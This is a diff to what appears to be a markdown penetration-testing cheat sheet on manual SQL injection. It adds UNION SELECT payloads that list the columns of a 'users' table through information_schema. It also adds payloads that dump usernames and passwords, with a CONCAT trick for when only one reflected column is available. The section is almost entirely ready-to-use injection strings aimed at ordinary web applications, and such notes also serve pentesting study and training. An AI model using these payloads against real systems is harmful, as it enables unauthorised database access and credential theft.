@@ -764,15 +764,25 @@ searchitem=1'+UNION+SELECT+1,2,3,table_name+FROM+information_schema.tables+WHERE
 ```
 searchitem=1'+UNION+SELECT+1,2,3,column_name+FROM+information_schema.columns+WHERE+table_name='users'--+-
 # Output: current_connections, total_connection, user, id, password, username
+1' UNION SELECT+1,2,3,column_name FROM information_schema.columns WHERE table_name='users'-- -
+```
+
+* If your reflected column is not the last one ensure your `FROM` is after the remaining `NULL`
+
+```
+4 UNION SELECT 1,2,3,column_name,5,6 FROM information_schema.columns WHERE table_name='users'-- -
 ```
 
 ### 8. Dump Credentials
 
-```
-searchitem=1'+UNION+SELECT+1,username,password,4+FROM+status.users--+-
-```
+<pre><code><strong>searchitem=1'+UNION+SELECT+1,username,password,4+FROM+status.users--+-
+</strong></code></pre>
 
-***
+* If you only have one reflected column to work with you can `CONCAT` multiple columns together
+
+```
+4' UNION SELECT 1,2,3,CONCAT(username,' ',password) AS CRED,5,6 FROM users-- -
+```
 
 ## SQLMap
 
